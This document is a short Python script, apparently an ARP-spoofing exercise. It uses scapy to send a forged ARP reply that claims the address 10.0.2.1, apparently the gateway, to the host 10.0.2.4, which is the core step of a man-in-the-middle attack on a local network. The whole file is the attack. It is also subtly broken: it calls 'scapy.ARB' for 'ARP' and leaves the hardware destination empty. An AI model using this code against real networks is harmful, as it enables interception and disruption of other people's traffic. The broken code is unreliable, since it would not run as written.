#!/usr/bin/env python3

import scapy.all as scapy


packet = scapy.ARB(op=2, pdst="10.0.2.4", hwdst="", psrc="10.0.2.1")
scapy.send(packet)
